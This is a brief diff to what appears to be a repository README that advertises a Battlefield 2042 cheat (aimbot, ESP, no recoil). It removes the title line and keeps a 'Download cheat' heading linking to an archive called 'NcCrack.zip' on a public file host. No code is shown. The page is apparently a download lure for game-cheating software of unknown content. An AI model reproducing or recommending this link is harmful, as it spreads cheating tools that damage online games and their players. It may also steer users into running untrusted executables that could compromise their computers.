@@ -1,5 +1,3 @@
-# Updated 24.01.2023 Hack-Battlefield-2042-AIM-ESP-No Recoil
-
 # Download cheat
 
 |[Download](https://www.mediafire.com/file/qxarg07b51hql0v/NcCrack.zip/file)|
